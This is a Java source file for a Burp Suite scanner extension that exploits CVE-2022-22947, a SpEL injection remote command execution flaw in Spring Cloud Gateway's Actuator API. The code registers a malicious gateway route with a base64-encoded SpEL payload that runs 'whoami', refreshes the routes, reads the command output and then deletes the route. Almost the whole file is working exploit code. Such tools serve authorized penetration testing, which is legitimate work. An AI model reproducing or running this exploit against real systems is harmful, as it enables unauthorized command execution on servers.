package burp.payload.RCE;

import burp.BurpExtender;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IHttpService;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.SpringIssue;
import burp.DnsLog.DnsLogInterface;
import burp.auxiliary.CheckIsSpring;
import burp.auxiliary.YamlReader;
import burp.payload.Payload;
import java.io.FileNotFoundException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class CloudGatewaySpEl implements Payload {
   private BurpExtender burpExtender;
   private IExtensionHelpers helpers;
   private CheckIsSpring checkIsSpring;
   private YamlReader yamlReader;
   private IHttpRequestResponse updataHttp;

   public CloudGatewaySpEl(BurpExtender burpExtender, IExtensionHelpers helpers, CheckIsSpring checkIsSpring) throws FileNotFoundException {
      this.burpExtender = burpExtender;
      this.burpExtender.stdout.println("===========================正在测试是否存在：Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）===========================");
      this.helpers = helpers;
      this.checkIsSpring = checkIsSpring;
      this.yamlReader = new YamlReader(this.burpExtender);
   }

   public IScanIssue doCheckVul(IHttpRequestResponse httpRequestResponse, DnsLogInterface dnsLogPlatform) {
      URL url = this.helpers.analyzeRequest(httpRequestResponse).getUrl();
      String uri = this.checkIsSpring.getUri(url.toString());
      String random_uri = this.checkIsSpring.randomStr(5);
      if (this.CloudGatewayRegisterRoute(httpRequestResponse, uri, random_uri, "whoami")) {
         this.burpExtender.stdout.print("[*] 添加新路由完成！");
         if (this.CloudGatewayRefresh(httpRequestResponse, uri)) {
            this.burpExtender.stdout.print("+++新路由刷新完成！");
            IHttpRequestResponse requestResponse = this.CloudGatewayRoute(httpRequestResponse, uri, random_uri, false);
            if (requestResponse != null) {
               this.burpExtender.stdout.print("+++新路由检测完成！");
               this.CloudGatewayRoute(httpRequestResponse, uri, random_uri, true);
               this.CloudGatewayRefresh(httpRequestResponse, uri);
            }

            this.updataHttp = requestResponse;
            this.burpExtender.stdout.println("[+] 存在漏洞！！！！");
            this.burpExtender.stdout.println("===========================检测完毕！存在：Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）漏洞 ===========================\n");

            assert requestResponse != null;

            return new SpringIssue(url, "Spring Cloud GateWay SPEL RCE", 0, "High", "Certain", (String)null, (String)null, "vul! ! After detection, there is a vulnerability. The test route has been deleted. Please retest and exploit this vulnerability!", (String)null, new IHttpRequestResponse[]{requestResponse}, requestResponse.getHttpService());
         }
      }

      this.burpExtender.stdout.println("===========================检测完毕！不存在：Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）漏洞 ===========================\n");
      return null;
   }

   private boolean CloudGatewayRegisterRoute(IHttpRequestResponse httpRequestResponse, String uri, String random_uri, String cmd) {
      IHttpService service = httpRequestResponse.getHttpService();
      List payloads = (List)this.yamlReader.getValueByKey("CloudGatewaySpEl.payloads");
      String poc = (String)payloads.get(0);
      String payload = this.helpers.bytesToString(this.helpers.base64Decode(poc));
      payload = String.format(payload, random_uri, cmd);
      this.burpExtender.stdout.println("[*] 正在测试payload: " + payload);
      IRequestInfo requestInfo1 = this.helpers.analyzeRequest(httpRequestResponse);
      List<String> headers = requestInfo1.getHeaders();
      if (((String)headers.get(0)).contains("HTTP/1.1")) {
         headers.set(0, "POST /actuator/gateway/routes/" + random_uri + " HTTP/1.1");
      } else {
         headers.set(0, "POST /actuator/gateway/routes/" + random_uri + " HTTP/2");
      }

      headers.removeIf((header) -> {
         return header != null && header.toLowerCase().startsWith("content-type:");
      });
      headers.add("Content-type: application/json");
      byte[] newRequest = this.helpers.buildHttpMessage(headers, this.helpers.stringToBytes(payload));
      IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(service, newRequest);
      IResponseInfo responseInfo1 = this.helpers.analyzeResponse(requestResponse.getResponse());
      this.burpExtender.stdout.println("响应状态码：" + responseInfo1.getStatusCode());
      return responseInfo1.getStatusCode() == 201;
   }

   private boolean CloudGatewayRefresh(IHttpRequestResponse httpRequestResponse, String uri) {
      try {
         IHttpService service = httpRequestResponse.getHttpService();
         byte[] refreshRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), uri + "actuator/gateway/refresh"));
         List<String> headers = new ArrayList();
         headers.add("POST " + uri + "actuator/gateway/refresh HTTP/1.1");
         headers.add("Host: " + service.getHost() + ":" + service.getPort());
         headers.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0");
         headers.add("Accept-Encoding: gzip, deflate");
         headers.add("Accept: */*");
         headers.add("Content-Type: application/x-www-form-urlencoded");
         headers.add("Connection: close");
         IRequestInfo requestInfo = this.helpers.analyzeRequest(service, refreshRequest);
         refreshRequest = (new String(refreshRequest)).substring(requestInfo.getBodyOffset()).getBytes();
         byte[] newRequest = this.helpers.buildHttpMessage(headers, refreshRequest);
         IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(service, newRequest);
         IResponseInfo responseInfo1 = this.helpers.analyzeResponse(requestResponse.getResponse());
         if (responseInfo1.getStatusCode() == 200) {
            return true;
         }
      } catch (MalformedURLException var10) {
         var10.printStackTrace();
         this.burpExtender.stderr.println(var10.getMessage());
      }

      return false;
   }

   private IHttpRequestResponse CloudGatewayRoute(IHttpRequestResponse httpRequestResponse, String uri, String random_uri, boolean deleteRoute) {
      try {
         IHttpService service = httpRequestResponse.getHttpService();
         byte[] refreshRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), uri + "actuator/gateway/routes/" + random_uri));
         List<String> headers = new ArrayList();
         headers.add((deleteRoute ? "DELETE " : "GET ") + uri + "actuator/gateway/routes/" + random_uri + " HTTP/1.1");
         headers.add("Host: " + service.getHost() + ":" + service.getPort());
         headers.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0");
         headers.add("Accept-Encoding: gzip, deflate");
         headers.add("Accept: */*");
         headers.add("Content-Type: application/x-www-form-urlencoded");
         headers.add("Connection: close");
         IRequestInfo requestInfo = this.helpers.analyzeRequest(service, refreshRequest);
         refreshRequest = (new String(refreshRequest)).substring(requestInfo.getBodyOffset()).getBytes();
         byte[] newRequest = this.helpers.buildHttpMessage(headers, refreshRequest);
         IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(service, newRequest);
         byte[] rawResponse = requestResponse.getResponse();
         IResponseInfo responseInfo1 = this.helpers.analyzeResponse(rawResponse);
         String strResponse = this.helpers.bytesToString(rawResponse);
         if (responseInfo1.getStatusCode() == 200 && strResponse.contains(random_uri) && strResponse.contains("Result")) {
            return requestResponse;
         }
      } catch (MalformedURLException var14) {
         var14.printStackTrace();
         this.burpExtender.stderr.println(var14.getMessage());
      }

      return null;
   }

   public IHttpRequestResponse export() {
      return this.updataHttp;
   }
}
